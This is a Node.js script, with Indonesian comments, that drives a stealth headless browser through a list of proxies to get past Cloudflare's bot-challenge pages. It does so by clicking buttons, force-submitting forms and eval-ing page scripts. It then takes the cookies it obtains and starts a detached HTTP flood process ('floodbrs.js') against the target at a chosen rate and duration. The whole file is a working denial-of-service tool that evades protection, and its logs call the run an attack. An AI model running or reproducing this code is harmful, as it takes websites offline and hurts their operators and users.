const fs = require('fs');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { spawn, exec } = require('child_process');

puppeteer.use(StealthPlugin());

const COLORS = {
    RED: '\x1b[31m',
    WHITE: '\x1b[37m',
    YELLOW: '\x1b[33m',
    GREEN: '\x1b[32m',
    CYAN: '\x1b[36m',
    BLUE: '\x1b[34m',
    RESET: '\x1b[0m'
};

// Utility functions
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
const coloredLog = (color, text) => console.log(`${color}${text}${COLORS.RESET}`);
const maskProxy = (proxy) => {
    const parts = proxy.split(':');
    return parts.length >= 2 ? `${parts[0]}.${parts[1]}.**.**:****` : proxy;
};

// Command-line arguments
const targetURL = process.argv[2];
const threads = parseInt(process.argv[3]);
const proxyFile = process.argv[4];
const rate = process.argv[5];
const duration = parseInt(process.argv[6]);

// Read proxies
const readProxies = (filePath) => {
    try {
        return fs.readFileSync(filePath, 'utf8').trim().split(/\r?\n/).filter(Boolean);
    } catch (error) {
        coloredLog(COLORS.RED, 'Error reading proxies file');
        return [];
    }
};

// DAFTAR TOMBOL CLOUDFLARE YANG LENGKAP
const getCloudflareButtonSelectors = () => {
    return [
        // Selector dasar
        'input[type="submit"]',
        'button[type="submit"]',
        'button',
        '.btn',
        '.button',
        
        // Selector khusus Cloudflare
        '#challenge-form input[type="submit"]',
        '#challenge-form button',
        'form input[type="submit"]',
        'form button',
        '[class*="challenge"] input[type="submit"]',
        '[class*="challenge"] button',
        '[class*="verify"]',
        '[class*="success"]',
        '[class*="human"]',
        
        // Selector by ID
        '#success',
        '#verify',
        '#submit',
        '#continue',
        '#proceed',
        
        // Selector by value/text
        'input[value*="Verify"]',
        'input[value*="Continue"]',
        'input[value*="Submit"]',
        'input[value*="Success"]',
        'input[value*="Proceed"]',
        'input[value*="Bypass"]',
        'button:contains("Verify")',
        'button:contains("Continue")',
        'button:contains("Submit")',
        'button:contains("Success")',
        'button:contains("Proceed")',
        'button:contains("Bypass")',
        
        // Tombol bahasa Indonesia
        'input[value*="Verifikasi"]',
        'input[value*="Lanjutkan"]',
        'input[value*="Kirim"]',
        'input[value*="Berhasil"]',
        'input[value*="Buktikan"]',
        'input[value*="Manusia"]',
        'button:contains("Verifikasi")',
        'button:contains("Lanjutkan")',
        'button:contains("Kirim")',
        'button:contains("Berhasil")',
        'button:contains("Buktikan")',
        'button:contains("Manusia")',
        
        // Tombol bahasa lain
        'input[value*="验证"]',
        'input[value*="继续"]',
        'input[value*="提交"]',
        'button:contains("验证")',
        'button:contains("继续")',
        'button:contains("提交")'
    ];
};

// CLOUDFLARE SOLVER DENGAN TOMBOL LENGKAP
const solveCloudflareChallenge = async (page, proxy) => {
    try {
        coloredLog(COLORS.WHITE, `[SOLVER] Starting: ${maskProxy(proxy)}`);
        
        // Tunggu halaman load
        await sleep(5000);
        
        let title = await page.title().catch(() => '');
        let currentUrl = page.url();
        
        coloredLog(COLORS.CYAN, `[SOLVER] Page: ${title}`);
        
        // Cek jika sudah berhasil
        if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
            !title.includes('Verifikasi') && !title.includes('DDoS protection') &&
            !currentUrl.includes('challenge') && !currentUrl.includes('cdn-cgi')) {
            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Already passed`);
            return { success: true, method: 'already_passed' };
        }
        
        coloredLog(COLORS.YELLOW, `[SOLVER] Cloudflare challenge detected`);
        
        // METHOD 1: Tunggu automatic solve
        coloredLog(COLORS.WHITE, `[SOLVER] Method 1: Waiting for auto-solve (20s)`);
        for (let i = 0; i < 20; i++) {
            await sleep(1000);
            title = await page.title().catch(() => '');
            currentUrl = page.url();
            
            if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
                !title.includes('Verifikasi')) {
                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Auto-solve after ${i + 1}s`);
                return { success: true, method: 'auto_solve' };
            }
        }
        
        // METHOD 2: Cari dan klik semua jenis tombol Cloudflare
        coloredLog(COLORS.WHITE, `[SOLVER] Method 2: Clicking all Cloudflare buttons`);
        
        const buttonSelectors = getCloudflareButtonSelectors();
        let foundButtons = [];
        
        // Kumpulkan semua tombol yang ada
        for (const selector of buttonSelectors) {
            try {
                const elements = await page.$$(selector);
                for (const element of elements) {
                    try {
                        const isVisible = await element.evaluate(el => {
                            if (!el) return false;
                            const rect = el.getBoundingClientRect();
                            const style = window.getComputedStyle(el);
                            return rect.width > 0 && 
                                   rect.height > 0 && 
                                   style.display !== 'none' && 
                                   style.visibility !== 'hidden' &&
                                   el.offsetParent !== null;
                        });
                        
                        if (isVisible) {
                            foundButtons.push({
                                element: element,
                                selector: selector
                            });
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        
        coloredLog(COLORS.CYAN, `[SOLVER] Found ${foundButtons.length} visible buttons`);
        
        // Klik semua tombol yang ditemukan
        for (const button of foundButtons) {
            try {
                coloredLog(COLORS.BLUE, `[SOLVER] Clicking: ${button.selector}`);
                
                // Scroll ke tombol
                await button.element.evaluate(el => {
                    el.scrollIntoView({ behavior: 'smooth', block: 'center' });
                });
                
                await sleep(1000);
                
                // Klik tombol
                await button.element.click();
                await sleep(5000);
                
                // Cek apakah berhasil
                title = await page.title().catch(() => '');
                currentUrl = page.url();
                
                if (!title.includes('Just a moment') && !title.includes('Checking your browser') && 
                    !title.includes('Verifikasi')) {
                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Button "${button.selector}" worked!`);
                    return { success: true, method: 'button_click' };
                }
                
                // Tunggu sebentar sebelum tombol berikutnya
                await sleep(2000);
                
            } catch (error) {
                coloredLog(COLORS.RED, `[SOLVER] Error clicking: ${error.message}`);
            }
        }
        
        // METHOD 3: Cari tombol dengan text content
        coloredLog(COLORS.WHITE, `[SOLVER] Method 3: Searching by button text`);
        
        const buttonTexts = [
            'Verify', 'Continue', 'Submit', 'Success', 'Proceed', 'Bypass',
            'Verifikasi', 'Lanjutkan', 'Kirim', 'Berhasil', 'Buktikan', 'Manusia',
            '验证', '继续', '提交', '인증', '계속', '제출'
        ];
        
        for (const text of buttonTexts) {
            try {
                const elements = await page.$$('input, button, a, div');
                for (const element of elements) {
                    try {
                        const elementText = await element.evaluate(el => el.textContent || el.value || '');
                        if (elementText.includes(text)) {
                            const isVisible = await element.evaluate(el => {
                                const rect = el.getBoundingClientRect();
                                return rect.width > 0 && rect.height > 0;
                            });
                            
                            if (isVisible) {
                                coloredLog(COLORS.BLUE, `[SOLVER] Clicking text: "${text}"`);
                                await element.click();
                                await sleep(5000);
                                
                                title = await page.title().catch(() => '');
                                if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                                    coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Text button "${text}" worked!`);
                                    return { success: true, method: 'text_button' };
                                }
                            }
                        }
                    } catch (e) {}
                }
            } catch (e) {}
        }
        
        // METHOD 4: Execute JavaScript challenges
        coloredLog(COLORS.WHITE, `[SOLVER] Method 4: Executing JavaScript`);
        try {
            await page.evaluate(() => {
                // Submit semua form
                const forms = document.forms;
                for (let i = 0; i < forms.length; i++) {
                    try {
                        forms[i].submit();
                    } catch (e) {}
                }
                
                // Trigger semua event submit
                const submitEvents = document.querySelectorAll('[onsubmit]');
                submitEvents.forEach(el => {
                    try {
                        const event = new Event('submit', { bubbles: true });
                        el.dispatchEvent(event);
                    } catch (e) {}
                });
                
                // Execute challenge scripts
                const scripts = document.querySelectorAll('script');
                scripts.forEach(script => {
                    try {
                        if (script.textContent.includes('challenge') || 
                            script.textContent.includes('verify') ||
                            script.textContent.includes('submit')) {
                            eval(script.textContent);
                        }
                    } catch (e) {}
                });
            });
            
            await sleep(8000);
            
            title = await page.title().catch(() => '');
            if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
                coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: JavaScript execution worked`);
                return { success: true, method: 'javascript' };
            }
        } catch (e) {}
        
        // METHOD 5: Reload dan coba lagi
        coloredLog(COLORS.WHITE, `[SOLVER] Method 5: Reloading page`);
        await page.reload();
        await sleep(10000);
        
        title = await page.title().catch(() => '');
        if (!title.includes('Just a moment') && !title.includes('Checking your browser')) {
            coloredLog(COLORS.GREEN, `[SOLVER] SUCCESS: Reload worked`);
            return { success: true, method: 'reload' };
        }
        
        coloredLog(COLORS.RED, `[SOLVER] FAILED: All methods exhausted`);
        return { success: false, method: 'failed' };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[SOLVER] ERROR: ${error.message}`);
        return { success: false, method: 'error' };
    }
};

// Extract cookies
const extractCookies = async (page, proxy) => {
    try {
        await sleep(3000);
        const cookies = await page.cookies();
        const cookieString = cookies.map(cookie => `${cookie.name}=${cookie.value}`).join('; ');
        
        coloredLog(COLORS.GREEN, `[COOKIES] Got ${cookies.length} cookies`);
        return { success: true, cookies: cookieString, cookieCount: cookies.length };
        
    } catch (error) {
        coloredLog(COLORS.RED, `[COOKIES] ERROR: ${error.message}`);
        return { success: false, cookies: '', cookieCount: 0 };
    }
};

// Browser launcher
const launchBrowser = async (targetURL, proxy) => {
    let browser;
    try {
        coloredLog(COLORS.YELLOW, `[BROWSER] Launching: ${maskProxy(proxy)}`);
        
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--disable-blink-features=AutomationControlled',
                '--no-first-run',
                '--no-default-browser-check',
                '--disable-extensions',
                '--disable-web-security',
                '--ignore-certificate-errors',
                '--ignore-ssl-errors',
                '--window-size=1920,1080',
                '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ]
        });
        
        const page = await browser.newPage();
        
        // Set user agent
        await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        
        // Navigate to target
        await page.goto(targetURL, { 
            waitUntil: 'domcontentloaded',
            timeout: 30000 
        });
        
        // Solve Cloudflare challenge
        const challengeResult = await solveCloudflareChallenge(page, proxy);
        
        if (!challengeResult.success) {
            throw new Error(`Challenge failed: ${challengeResult.method}`);
        }
        
        coloredLog(COLORS.GREEN, `[SUCCESS] Cloudflare solved via ${challengeResult.method}`);
        
        // Extract cookies
        const cookieResult = await extractCookies(page, proxy);
        
        // Launch flood process
        if (cookieResult.success) {
            const floodProcess = spawn('node', [
                'floodbrs.js',
                targetURL,
                duration.toString(),
                rate,
                '1',
                proxyFile,
                cookieResult.cookies,
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'cloudflare-key'
            ], {
                detached: true,
                stdio: 'ignore'
            });
            
            floodProcess.unref();
            coloredLog(COLORS.GREEN, `[ATTACK] Flood process started with ${cookieResult.cookieCount} cookies`);
        }
        
        await browser.close();
        return true;
        
    } catch (error) {
        if (browser) await browser.close();
        coloredLog(COLORS.RED, `[BROWSER] ERROR: ${error.message}`);
        return false;
    }
};

// Main execution
const main = async () => {
    const proxies = readProxies(proxyFile);
    if (proxies.length === 0) {
        coloredLog(COLORS.RED, '[ERROR] No proxies found');
        return;
    }

    coloredLog(COLORS.GREEN, `[START] Cloudflare solver with ${proxies.length} proxies`);
    
    let successCount = 0;
    
    // Process proxies
    for (let i = 0; i < proxies.length; i++) {
        const proxy = proxies[i];
        const success = await launchBrowser(targetURL, proxy);
        if (success) successCount++;
        
        coloredLog(COLORS.CYAN, `[PROGRESS] ${i + 1}/${proxies.length} - ${successCount} successful`);
        
        // Delay between proxies
        if (i < proxies.length - 1) {
            await sleep(3000);
        }
    }
    
    coloredLog(COLORS.GREEN, `[COMPLETE] ${successCount}/${proxies.length} proxies successful`);
    
    // Wait for attack duration
    await sleep(duration * 1000);
    coloredLog(COLORS.YELLOW, '[SHUTDOWN] Attack completed');
};

// Handle process exit
process.on('SIGINT', () => {
    coloredLog(COLORS.YELLOW, '[INFO] Stopping...');
    exec('pkill -f node', () => {});
    process.exit(0);
});

coloredLog(COLORS.GREEN, '[READY] 🛡️ ADVANCED CLOUDFLARE SOLVER STARTED 🛡️');
main().catch(err => {
    coloredLog(COLORS.RED, `[MAIN ERROR] ${error.message}`);
});
